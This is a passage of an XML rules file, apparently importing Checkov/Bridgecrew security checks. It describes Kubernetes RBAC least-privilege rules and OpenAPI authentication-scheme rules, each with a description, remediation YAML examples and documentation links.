<li>On the top bar, select Menu &gt; Admin.</li>
<li>On the left sidebar, select Settings &gt; General (/admin/application_settings/general).</li>
<li>Expand the Sign-in restrictions section, where you can configure both.</li>
</ol>
<p>Enforce 2FA only for certain groups:</p>
<ol>
<li>Go to the group&#8217;s Settings &gt; General page.</li>
<li>Expand the Permissions and group features section.</li>
<li>Select the Require all users in this group to set up two-factor authentication option.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-all-gitlab-groups-require-two-factor-authentication' target='_blank'> https://docs.bridgecrew.io/docs/ensure-all-gitlab-groups-require-two-factor-authentication</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-all-gitlab-groups-require-two-factor-authentication' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_155</key>
    <name>Ensure ClusterRoles that grant control over validating or mutating admission webhook configurations are minimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="clusterroles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cluster-roles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-not-minimized"></div>ClusterRoles that grant control over validating or mutating admission webhook configurations are not minimized</div><a aria-label="Skip link to ClusterRoles that grant control over validating or mutating admission webhook configurations are not minimized" class="heading-anchor-icon fa fa-anchor" href="#clusterroles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-not-minimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ClusterRoles that grant write permissions over admission webhook should be minimized to reduce powerful identities in the cluster. Validating admission webhooks can read every object admitted to the cluster, while mutating admission webhooks can read and mutate every object admitted to the cluster. As such, ClusterRoles that grant control over admission webhooks are granting near cluster admin privileges. Minimize such ClusterRoles to limit the number of powerful credentials that if compromised could take over the entire cluster. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong>: ClusterRole </li>
<li><strong>Argument</strong>: rules<br/>
ClusterRoles that grant the "create", "update" or "patch" verbs over the "mutatingwebhookconfigurations" or "validatingwebhookconfigurations" resources in the "admissionregistration.k8s.io" API group are granting control over admission webhooks.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: &lt;ClusterRole-name&gt;
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get"]
- apiGroups: ["admissionregistration.k8s.io"]
  resources: ["mutatingwebhookconfigurations"]
  verbs:
  - list
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-minimized' target='_blank'> https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-minimized</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-minimized' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_156</key>
    <name>Ensure ClusterRoles that grant permissions to approve CertificateSigningRequests are minimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="clusterroles-that-grant-permissions-to-approve-certificatesigningrequests-are-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cluster-roles-that-grant-permissions-to-approve-certificate-signing-requests-are-not-minimized"></div>ClusterRoles that grant permissions to approve CertificateSigningRequests are not minimized</div><a aria-label="Skip link to ClusterRoles that grant permissions to approve CertificateSigningRequests are not minimized" class="heading-anchor-icon fa fa-anchor" href="#clusterroles-that-grant-permissions-to-approve-certificatesigningrequests-are-not-minimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ClusterRoles that grant permissions to approve CertificateSigningRequests should be minimized to reduce powerful identities in the cluster. Approving CertificateSigningRequests allows one to issue new credentials for any user or group. As such, ClusterRoles that grant permissions to approve CertificateSigningRequests are granting cluster admin privileges. Minimize such ClusterRoles to limit the number of powerful credentials that if compromised could take over the entire cluster. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong>: ClusterRole </li>
<li><strong>Argument</strong>: rules<br/>
ClusterRoles that grant the "update" verbs over the "certificatesigningrequests/approval" and the "approve" verb over "signers" in the "certificates.k8s.io" API group are granting permissions to approve CertificateSigningRequests</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: &lt;ClusterRole-name&gt;
rules:
- apiGroups: ["certificates.k8s.io"]
  resources: ["certificatesigningrequests"]
  verbs: ["get", "list", "create]
x- apiGroups: ["certificates.k8s.io"]
x  resources: ["certificatesigningrequests/approval"]
x  verbs: ["update"]
x- apiGroups: ["certificates.k8s.io"]
x  resources: ["signers"]
x  verbs: ["approve"]
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-permissions-to-approve-certificatesigningrequests-are-minimized' target='_blank'> https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-permissions-to-approve-certificatesigningrequests-are-minimized</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-permissions-to-approve-certificatesigningrequests-are-minimized' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_157</key>
    <name>Ensure Roles and ClusterRoles that grant permissions to bind RoleBindings or ClusterRoleBindings are minimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="roles-and-clusterroles-that-grant-permissions-to-bind-rolebindings-or-clusterrolebindings-are-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-roles-and-cluster-roles-that-grant-permissions-to-bind-role-bindings-or-cluster-role-bindings-are-not-minimized"></div>Roles and ClusterRoles that grant permissions to bind RoleBindings or ClusterRoleBindings are not minimized</div><a aria-label="Skip link to Roles and ClusterRoles that grant permissions to bind RoleBindings or ClusterRoleBindings are not minimized" class="heading-anchor-icon fa fa-anchor" href="#roles-and-clusterroles-that-grant-permissions-to-bind-rolebindings-or-clusterrolebindings-are-not-minimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Role or ClusterRoles that grant permissions to bind RoleBindings or ClusterRoleBindings should be minimized to reduce powerful identities in the cluster. Such Roles and ClusterRoles can attach existing permissions (Roles and ClusterRoles) to arbitrary identities. RoleBindings grant permissions over a namespace, while ClusterRoleBindings grant permissions over the entire cluster. Minimize such Roles and ClusterRoles to limit the number of powerful credentials that if compromised could escalate privileges and possibly take over the entire cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong>: ClusterRole, Role</li>
<li><strong>Argument</strong>: rules<br/>
ClusterRoles and Roles that grant the "bind" verbs over "clusterrolebindings" or "rolebindings" in the "rbac.authorization.k8s.io" API group should be minimized.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: &lt;ClusterRole-name&gt;
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "clusterroles"]
  verbs: ["get", "list", "create", "update"]
x- apiGroups: ["rbac.authorization.k8s.io"]
x  resources: ["clusterrolebindings"]
x  verbs: ["bind"]
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-bind-rolebindings-or-clusterrolebindings-are-minimized' target='_blank'> https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-bind-rolebindings-or-clusterrolebindings-are-minimized</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-bind-rolebindings-or-clusterrolebindings-are-minimized' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_158</key>
    <name>Ensure Roles and ClusterRoles that grant permissions to escalate Roles or ClusterRole are minimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="roles-and-clusterroles-that-grant-permissions-to-escalate-roles-or-clusterrole-are-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-roles-and-cluster-roles-that-grant-permissions-to-escalate-roles-or-cluster-role-are-not-minimized"></div>Roles and ClusterRoles that grant permissions to escalate Roles or ClusterRole are not minimized</div><a aria-label="Skip link to Roles and ClusterRoles that grant permissions to escalate Roles or ClusterRole are not minimized" class="heading-anchor-icon fa fa-anchor" href="#roles-and-clusterroles-that-grant-permissions-to-escalate-roles-or-clusterrole-are-not-minimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description-1"></a></h1>
<p>Role or ClusterRoles that grant permissions to escalate Roles or ClusterRoles should be minimized to reduce powerful identities in the cluster. Such Roles and ClusterRoles can add arbitrary permissions to arbitrary identities. Escalating Roles can add permissions over a namespace, while escalating ClusterRoles can add permissions over the entire cluster. Minimize such Roles and ClusterRoles to limit the number of powerful credentials that if compromised could escalate privileges and possibly take over the entire cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong>: ClusterRole, Role</li>
<li><strong>Argument</strong>: rules<br/>
ClusterRoles and Roles that grant the "escalate" verbs over "clusterroles" or "roles" in the "rbac.authorization.k8s.io" API group should be minimized.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: &lt;ClusterRole-name&gt;
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "clusterrolebindings"]
  verbs: ["get", "list", "create", "update"]
x- apiGroups: ["rbac.authorization.k8s.io"]
x  resources: ["clusterroles"]
x  verbs: ["escalate"]
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-escalate-roles-or-clusterrole-are-minimized' target='_blank'> https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-escalate-roles-or-clusterrole-are-minimized</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-escalate-roles-or-clusterrole-are-minimized' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENAPI_1</key>
    <name>Ensure that securityDefinitions is defined and not empty</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="openapi-securitydefinitions-is-not-defined-or-is-empty"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-open-api-security-definitions-is-not-defined-or-is-empty"></div>OpenAPI securityDefinitions is not defined or is empty</div><a aria-label="Skip link to OpenAPI securityDefinitions is not defined or is empty" class="heading-anchor-icon fa fa-anchor" href="#openapi-securitydefinitions-is-not-defined-or-is-empty"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>securityDefinitions in OpenAPI/Swagger 2.0 files allow you to define the authentication types that your API supports. Having no authentication exposes your APIs to attacks and having no documented authentication type makes it more difficult to understand accessing your API.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Ensure that your OpenAPI 2.0 spec includes a securityDefinitions section. For example:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">securityDefinitions:
  BasicAuth:
    type: basic
  ApiKeyAuth:
    type: apiKey
    in: header
    name: apiKey
  OAuth2:
    type: oauth2
    flow: implicit
    authorizationUrl: https://swagger.io/api/oauth/dialog
    tokenUrl: https://swagger.io/api/oauth/token
    scopes:
      read: read
      write: write 
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-securitydefinitions-is-defined-and-not-empty' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-securitydefinitions-is-defined-and-not-empty</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-securitydefinitions-is-defined-and-not-empty' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENAPI_2</key>
    <name>Ensure that if the security scheme is not of type 'oauth2', the array value must be empty</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-that-if-the-security-scheme-is-not-of-type-oauth2-the-array-value-must-be-empty"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-that-if-the-security-scheme-is-not-of-type-oauth-2-the-array-value-must-be-empty"></div>Ensure that if the security scheme is not of type 'oauth2', the array value must be empty</div><a aria-label="Skip link to Ensure that if the security scheme is not of type 'oauth2', the array value must be empty" class="heading-anchor-icon fa fa-anchor" href="#ensure-that-if-the-security-scheme-is-not-of-type-oauth2-the-array-value-must-be-empty"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Only OAuth 2.0 defined in the securityDefinitions section should have a value in the security section.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Ensure that your generated OpenAPI document does not include a security section for authentication types that are not OAuth 2.0. Below is an example:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">securityDefinitions:
  some_auth:
    type: basic
- security:
-  - some_auth:
-      - write: some
-      - read: some
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-if-the-security-scheme-is-not-of-type-oauth2-the-array-value-must-be-empty' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-if-the-security-scheme-is-not-of-type-oauth2-the-array-value-must-be-empty</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-if-the-security-scheme-is-not-of-type-oauth2-the-array-value-must-be-empty' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENAPI_3</key>
    <name>Ensure that security schemes don't allow cleartext credentials over unencrypted channel</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-scheme-allows-cleartext-credentials-over-unencrypted-channels"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-scheme-allows-cleartext-credentials-over-unencrypted-channels"></div>Security scheme allows cleartext credentials over unencrypted channels</div><a aria-label="Skip link to Security scheme allows cleartext credentials over unencrypted channels" class="heading-anchor-icon fa fa-anchor" href="#security-scheme-allows-cleartext-credentials-over-unencrypted-channels"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Sending credentials over HTTP in cleartext expose your API calls to man-in-the-middle attacks among others. Ensure that you are using an encrypted channel for sending credentials.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Ensure that you aren't using the unencryptedScheme. For example:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">components:
  securitySchemes:
-    unencryptedScheme:
-      type: http
-      scheme: basic
+    encryptedScheme:
+      type: oauth2
paths:
  "/":
    get:
      security:
-        - unencryptedScheme: []
+        - encryptedScheme:
+            - write
+            - read
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-security-schemes-dont-allow-cleartext-credentials-over-unencrypted-channel' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-security-schemes-dont-allow-cleartext-credentials-over-unencrypted-channel</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-security-schemes-dont-allow-cleartext-credentials-over-unencrypted-channel' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENAPI_4</key>
    <name>Ensure that the global security field has rules defined</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-object-needs-to-have-defined-rules-in-its-array-and-rules-should-be-defined-in-the-securityscheme"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-object-needs-to-have-defined-rules-in-its-array-and-rules-should-be-defined-in-the-security-scheme"></div>Security object needs to have defined rules in its array and rules should be defined in the securityScheme</div><a aria-label="Skip link to Security object needs to have defined rules in its array and rules should be defined in the securityScheme" class="heading-anchor-icon fa fa-anchor" href="#security-object-needs-to-have-defined-rules-in-its-array-and-rules-should-be-defined-in-the-securityscheme"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>OpenAPI uses security schemes to reference authentication and authorization schemes. Your APIs should have authentication schemes in place and documented in the OpenAPI specification, as well as applied to individual operations or the whole API in the security details.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Ensure that you have a securityScheme component and application. For example:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">components:
+  securitySchemes:
+    basicAuth:
+      type: http
+      scheme: basic

security:
+  - basicAuth: []
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-global-security-field-has-rules-defined' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-global-security-field-has-rules-defined</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-global-security-field-has-rules-defined' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENAPI_5</key>
    <name>Ensure that security operations is not empty</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-object-for-operations-if-defined-must-define-a-security-scheme-otherwise-it-should-be-considered-an-error"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-object-for-operations-if-defined-must-define-a-security-scheme-otherwise-it-should-be-considered-an-error"></div>Security object for operations, if defined, must define a security scheme, otherwise it should be considered an error</div><a aria-label="Skip link to Security object for operations, if defined, must define a security scheme, otherwise it should be considered an error" class="heading-anchor-icon fa fa-anchor" href="#security-object-for-operations-if-defined-must-define-a-security-scheme-otherwise-it-should-be-considered-an-error"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">security</code> section of the operation path applies an authentication method to that operation. Leaving it blank implies an exposed API without authentication.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Ensure that you have an authentication type in the security section of your path. For example:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">paths:
  "/":
    get:
      operationId: id
      summary: example
-     security: []
+     security:
+       - OAuth2:
+           - write
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-security-operations-is-not-empty' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-security-operations-is-not-empty</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-security-operations-is-not-empty' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENAPI_6</key>
    <name>Ensure that security requirement defined in securityDefinitions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-requirement-not-defined-in-the-security-definitions"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-requirement-not-defined-in-the-security-definitions"></div>Security requirement not defined in the security definitions</div><a aria-label="Skip link to Security requirement not defined in the security definitions" class="heading-anchor-icon fa fa-anchor" href="#security-requirement-not-defined-in-the-security-definitions"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Security definitions in the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">security</code> section of a path or root should refer to an authentication scheme identified in the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">securityDefinitions</code> section.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Example:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">...
security:
  - petstore_auth:
      - write:pets
      - read:pets
...
+ petstore_auth:
+    type: oauth2
+    authorizationUrl: http://swagger.io/api/oauth/dialog
+    flow: implicit
+    scopes:
+      write:pets: write
+      read:pets: read
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-security-requirement-defined-in-securitydefinitions' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-security-requirement-defined-in-securitydefinitions</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-security-requirement-defined-in-securitydefinitions' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_1</key>
    <name>Ensure ACTIONS_ALLOW_UNSECURE_COMMANDS isn't true on environment variables</name>
    <description>
